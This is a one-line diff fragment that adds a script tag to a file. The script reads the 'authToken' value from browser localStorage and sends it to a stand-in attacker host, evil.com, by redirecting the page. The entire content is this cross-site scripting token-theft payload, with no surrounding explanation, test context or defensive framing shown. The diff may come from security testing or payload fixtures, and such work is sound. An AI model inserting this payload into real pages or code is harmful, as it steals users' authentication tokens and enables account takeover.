@@ -1,0 +1,1 @@
+<script>window.location='https://evil.com/admin?token='+localStorage.getItem('authToken');</script>
